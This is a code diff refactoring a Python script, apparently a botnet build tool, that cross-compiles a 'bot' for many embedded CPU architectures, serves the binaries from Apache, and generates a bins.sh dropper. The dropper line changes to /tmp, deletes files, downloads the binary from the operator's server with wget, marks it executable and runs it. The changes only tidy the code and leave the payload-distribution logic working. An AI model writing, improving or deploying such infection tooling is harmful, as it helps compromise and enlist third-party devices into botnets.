@@ -1,19 +1,15 @@
 import subprocess, sys
-	
+
 if len(sys.argv[2]) != 0:
     ip = sys.argv[2]
 else:
     print("\x1b[0;31mIncorrect Usage!")
     print("\x1b[0;32mpython NSA.py <Bot Name> <Server IP>\x1b[0m")
     exit(1)
-	
+
 bot = sys.argv[1]
 YN = raw_input("Get arch's? Y/n:")
-if YN.lower() == "y":
-    get_arch = True
-else:
-    get_arch = False
-
+get_arch = YN.lower() == "y"
 compiles = ["mips",
              "mipsel",
              "sh4",
@@ -56,18 +52,17 @@ if get_arch == True:
     print("Downloading Architectures")
 
     for arch in getarch:
-        run("wget " + arch + " --no-check-certificate >> /dev/null")
+        run(f"wget {arch} --no-check-certificate >> /dev/null")
         run("tar -xvf *.tar.*")
         run("rm -rf *tar.bz2")
-		
+
     print("Cross Compilers Downloaded...")
 
-num = 0
-for cc in ccs:
+for num, cc in enumerate(ccs):
     arch = cc.split("-")[2]
-    run("./"+cc+"/bin/"+arch+"-gcc -static -lpthread -pthread -D" + arch.upper() + " -o " + compiles[num] + " " + bot + " > /dev/null")
-    num += 1
-
+    run(
+        f"./{cc}/bin/{arch}-gcc -static -lpthread -pthread -D{arch.upper()} -o {compiles[num]} {bot} > /dev/null"
+    )
 print("Cross Compiling Done!")
 print("Setting up your apache")
 
@@ -77,13 +72,15 @@ run("service apache2 start")
 run("service httpd start")
 
 for i in compiles:
-    run("mv " + i + " /var/www/html/")
+    run(f"mv {i} /var/www/html/")
 
 run("service apache2 restart")
 run("service httpd restart")
 
 for i in compiles:
-    run('echo -e "cd /tmp; rm -rf *; wget -q http://' + ip + '/' + i + '; chmod +x ' + i + '; sh ' + i + '; rm -rf *" >> /var/www/html/bins.sh')
+    run(
+        f'echo -e "cd /tmp; rm -rf *; wget -q http://{ip}/{i}; chmod +x {i}; sh {i}; rm -rf *" >> /var/www/html/bins.sh'
+    )
 
 run("service apache2 restart")
 run("service httpd restart")
